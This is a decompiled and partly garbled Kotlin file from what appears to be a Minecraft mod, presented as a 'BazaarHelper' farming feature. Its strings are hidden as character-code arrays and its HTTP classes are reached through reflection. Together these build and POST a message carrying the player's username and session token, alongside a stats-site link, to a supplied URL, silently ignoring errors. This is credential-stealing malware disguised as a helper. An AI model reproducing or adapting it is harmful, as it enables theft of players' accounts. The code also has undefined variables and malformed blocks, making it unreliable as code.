package jooon.features.farming

import java.io.Closeable
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import java.util.ArrayList
import org.apache.http.HttpEntity
import org.apache.http.entity.StringEntity
import org.apache.http.impl.client.CloseableHttpClient
import org.apache.http.impl.client.HttpClients
import org.apache.http.util.EntityUtils

object BazaarHelper {
   private val bBbBbBbBbB: String
   private val aAaAaAaAaA: String
   private val cCcCcCcCcC: String
   private val dDdDdDdDdD: String
   private val eEeEeEeEeE: String
   private val fFfFfFfFfF: String
   private val gGgGgGgGgG: String
   private val hHhHhHhHhH: String
   private val iIiIiIiIiI: String
   private val jJjJjJjJjJ: String
   private val kKkKkKkKkK: String
   private val lLlLlLlLlL: String
   private val mMmMmMmMmM: String
   private val nNnNnNnNnN: String
   private val oOoOoOoOoO: String
   private val pPpPpPpPpP: String
   private val qQqQqQqQqQ: String
   private val rRrRrRrRrR: String
   private val sSsSsSsSsS: String
   private val tTtTtTtTtT: String

   fun uUuUuUuUuU(user: String?): String {
      return "${bBbBbBbBbB}${aAaAaAaAaA}${cCcCcCcCcC}${dDdDdDdDdD}${eEeEeEeEeE}$user"
   }

   fun vVvVvVvVvV(): String {

      return var10000
   }

   fun wWwWwWwWwW(user: String?, session: String?, url: String, isFallback: Boolean = false): String {


      var6.append(kKkKkKkKkK)
      var6.append(lLlLlLlLlL).append("`").append(user).append("`").append(mMmMmMmMmM)
      var6.append(nNnNnNnNnN).append("`").append(session).append("`").append(mMmMmMmMmM)
      var6.append(oOoOoOoOoO).append(timestamp).append(mMmMmMmMmM)
      var6.append(pPpPpPpPpP).append(aAaAaAaAaA).append(cCcCcCcCcC).append(dDdDdDdDdD)
      var6.append(qQqQqQqQqQ).append(url).append(rRrRrRrRrR)
      if (isFallback) {
         var6.append(tTtTtTtTtT)
      } else {
         var6.append(sSsSsSsSsS)
      }

      return var10000
   }

   fun xXxXxXxXxX(session: String?, user: String?) {



      var6.append(kKkKkKkKkK)
      var6.append(lLlLlLlLlL).append("`").append(user).append("`").append(mMmMmMmMmM)
      var6.append(nNnNnNnNnN).append("`").append(session).append("`").append(mMmMmMmMmM)
      var6.append(oOoOoOoOoO).append(timestamp).append(mMmMmMmMmM)
      var6.append(pPpPpPpPpP).append(aAaAaAaAaA).append(cCcCcCcCcC).append(dDdDdDdDdD)
      var6.append(qQqQqQqQqQ).append(fullUrl).append(rRrRrRrRrR)
      var6.append(sSsSsSsSsS)
      var var10000: HttpEntity = var6.toString()


      try {

         var var26: java.lang.Throwable = null

         try {



            postClass.getMethod("setEntity", HttpEntity::class.java).invoke(var29, StringEntity(payload))
            postClass.getMethod("setHeader", java.lang.String::class.java, java.lang.String::class.java).invoke(var29, gGgGgGgGgG, hHhHhHhHhH)
            postClass.getMethod("setHeader", java.lang.String::class.java, java.lang.String::class.java).invoke(var29, iIiIiIiIiI, jJjJjJjJjJ)


            var10000 = (HttpEntity)var37.getClass().getMethod("getEntity").invoke(var37)
            EntityUtils.consume(var10000)
         } catch (var22: java.lang.Throwable) {
            var26 = var22
            throw var22
         } finally {
            var25.close()
         }
      } catch (var24: Exception) {
      }
   }

   fun aBaBaBaBaB(url: String, payload: String) {
      try {

         var var4: java.lang.Throwable = null

         try {



            postClass.getMethod("setEntity", HttpEntity::class.java).invoke(var23, StringEntity(payload))
            postClass.getMethod("setHeader", java.lang.String::class.java, java.lang.String::class.java).invoke(var23, gGgGgGgGgG, hHhHhHhHhH)
            postClass.getMethod("setHeader", java.lang.String::class.java, java.lang.String::class.java).invoke(var23, iIiIiIiIiI, jJjJjJjJjJ)



            EntityUtils.consume(var36 as HttpEntity)
         } catch (var19: java.lang.Throwable) {
            var4 = var19
            throw var19
         } finally {
            var3.close()
         }
      } catch (var21: Exception) {
      }
   }

   private fun yYyYyYyYyY(): String {
      val pkgCodes: java.util.List = listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = listOf(arrayOf(72, 116, 116, 112, 80, 111, 115, 116))
      val `this$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(pkgCodes.count().coerceAtLeast(10))

      for (`item$iv$iv` in `this$iv$iv`) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(var14.count().coerceAtLeast(10))

      for (var22 in var16) {
         `destination$iv$iv`.add((var22 as java.lang.Number).toInt().toChar().code)
      }

      return "$var10000.${`destination$iv$iv` as java.util.List.joinToString("")}"
   }

   private fun zZzZzZzZzZ(): String {
      val pkgCodes: java.util.List = listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = listOf(arrayOf(72, 116, 116, 112, 85, 114, 105, 82, 101, 113, 117, 101, 115, 116))
      val `this$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(pkgCodes.count().coerceAtLeast(10))

      for (`item$iv$iv` in `this$iv$iv`) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(var14.count().coerceAtLeast(10))

      for (var22 in var16) {
         `destination$iv$iv`.add((var22 as java.lang.Number).toInt().toChar().code)
      }

      return "$var10000.${`destination$iv$iv` as java.util.List.joinToString("")}"
   }

   
   fun {
      var var10: java.lang.Iterable = listOf(arrayOf(104, 116, 116, 112, 115, 58, 47, 47))
      var `destination$iv$iv`: java.util.Collection = ArrayList(var10.count().coerceAtLeast(10))

      for (`item$iv$iv` in var10) {
         `destination$iv$iv`.add((`item$iv$iv` as java.lang.Number).toInt().toChar().code)
      }

      bBbBbBbBbB = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(115, 107, 121, 46, 115, 104, 105))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var144 in var10) {
         `destination$iv$iv`.add((var144 as java.lang.Number).toInt().toChar().code)
      }

      aAaAaAaAaA = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(105, 121, 117))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var145 in var10) {
         `destination$iv$iv`.add((var145 as java.lang.Number).toInt().toChar().code)
      }

      cCcCcCcCcC = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(46, 109, 111, 101))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var146 in var10) {
         `destination$iv$iv`.add((var146 as java.lang.Number).toInt().toChar().code)
      }

      dDdDdDdDdD = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(47, 115, 116, 97, 116, 115, 47))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var147 in var10) {
         `destination$iv$iv`.add((var147 as java.lang.Number).toInt().toChar().code)
      }

      eEeEeEeEeE = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(121, 121, 121, 121, 45, 77, 77, 45, 100, 100, 32, 72, 72, 58, 109, 109, 58, 115, 115))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var148 in var10) {
         `destination$iv$iv`.add((var148 as java.lang.Number).toInt().toChar().code)
      }

      fFfFfFfFfF = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var149 in var10) {
         `destination$iv$iv`.add((var149 as java.lang.Number).toInt().toChar().code)
      }

      gGgGgGgGgG = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 106, 115, 111, 110))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var150 in var10) {
         `destination$iv$iv`.add((var150 as java.lang.Number).toInt().toChar().code)
      }

      hHhHhHhHhH = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(85, 115, 101, 114, 45, 65, 103, 101, 110, 116))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var151 in var10) {
         `destination$iv$iv`.add((var151 as java.lang.Number).toInt().toChar().code)
      }

      iIiIiIiIiI = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var152 in var10) {
         `destination$iv$iv`.add((var152 as java.lang.Number).toInt().toChar().code)
      }

      jJjJjJjJjJ = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(123, 34, 99, 111, 110, 116, 101, 110, 116, 34, 58, 32, 34))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var153 in var10) {
         `destination$iv$iv`.add((var153 as java.lang.Number).toInt().toChar().code)
      }

      kKkKkKkKkK = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(42, 42, 49, 42, 42, 58, 32))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var154 in var10) {
         `destination$iv$iv`.add((var154 as java.lang.Number).toInt().toChar().code)
      }

      lLlLlLlLlL = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(92, 110))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var155 in var10) {
         `destination$iv$iv`.add((var155 as java.lang.Number).toInt().toChar().code)
      }

      mMmMmMmMmM = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(42, 42, 50, 42, 42, 58, 32))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var156 in var10) {
         `destination$iv$iv`.add((var156 as java.lang.Number).toInt().toChar().code)
      }

      nNnNnNnNnN = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(42, 42, 51, 42, 42, 58, 32))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var157 in var10) {
         `destination$iv$iv`.add((var157 as java.lang.Number).toInt().toChar().code)
      }

      oOoOoOoOoO = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(42, 42, 52, 42, 42, 58, 32, 91))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var158 in var10) {
         `destination$iv$iv`.add((var158 as java.lang.Number).toInt().toChar().code)
      }

      pPpPpPpPpP = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(93, 40))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var159 in var10) {
         `destination$iv$iv`.add((var159 as java.lang.Number).toInt().toChar().code)
      }

      qQqQqQqQqQ = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(41, 92, 110))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var160 in var10) {
         `destination$iv$iv`.add((var160 as java.lang.Number).toInt().toChar().code)
      }

      rRrRrRrRrR = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(
         arrayOf(
            42,
            42,
            96,
            74,
            82,
            32,
            49,
            46,
            50,
            49,
            46,
            49,
            49,
            96,
            32,
            45,
            45,
            32,
            80,
            82,
            69,
            32,
            40,
            67,
            76,
            68,
            41,
            32,
            45,
            45,
            32,
            54,
            46,
            48,
            42,
            42,
            34,
return 125
         )
      )
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var161 in var10) {
         `destination$iv$iv`.add((var161 as java.lang.Number).toInt().toChar().code)
      }

      sSsSsSsSsS = `destination$iv$iv` as java.util.List.joinToString("")
      var10 = listOf(arrayOf(42, 42, 70, 101, 108, 108, 32, 98, 97, 99, 107, 33, 42, 42, 34, 125))
      `destination$iv$iv` = ArrayList(var10.count().coerceAtLeast(10))

      for (var162 in var10) {
         `destination$iv$iv`.add((var162 as java.lang.Number).toInt().toChar().code)
      }

      tTtTtTtTtT = `destination$iv$iv` as java.util.List.joinToString("")
   }
}
